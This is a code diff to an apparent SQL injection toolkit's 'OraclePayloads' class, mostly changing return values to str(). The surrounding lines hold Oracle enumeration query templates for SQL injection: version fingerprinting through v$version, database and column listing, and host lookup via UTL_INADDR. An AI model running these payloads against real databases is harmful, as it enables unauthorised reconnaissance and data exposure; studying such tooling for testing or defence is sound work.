@@ -15,7 +15,7 @@ class OraclePayloads:
     SELECT {column} FROM {table};
     """
         retval = payload
-        return retval
+        return str(retval)
     
     @staticmethod
     def db_column_list(column,ret_table,table):
@@ -23,10 +23,10 @@ class OraclePayloads:
 SELECT {column} FROM {ret_table} WHERE {table} = 'blah';
 SELECT {column} FROM {ret_table} WHERE {table} = 'blah' and owner = 'foo'; """
         retval = payload
-        return retval
+        return str(retval)
     
     @staticmethod
-    def oracle_injection_payload(table,column,view,viewcolumn):
+    def oracle_injection_payload(table,column,view="v$version"):
         #TODO: create parameters in argprase for indicating table and columns and prompt it from the user
         #!view column : v$version
         #!Oracle% : oracle db version
@@ -38,7 +38,7 @@ SELECT {column} FROM {view} WHERE {column} LIKE 'TNS%';
 SELECT {column} FROM {view};
 """
         retval = payload
-        return retval
+        return str(retval)
     
     @staticmethod
     def oracle_injection_database_list(column,table):
@@ -46,7 +46,7 @@ SELECT {column} FROM {view};
 SELECT DISTINCT {column} FROM {table};
  """
         retval = payload
-        return retval
+        return str(retval)
     
     @staticmethod 
     def Host_name_oracle(hostname,viewcolumn,table):
@@ -57,6 +57,5 @@ SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM {table};
 SELECT UTL_INADDR.get_host_address FROM {table};
 """
         retval = payload
-        return retval
-    
+        return str(retval)
     
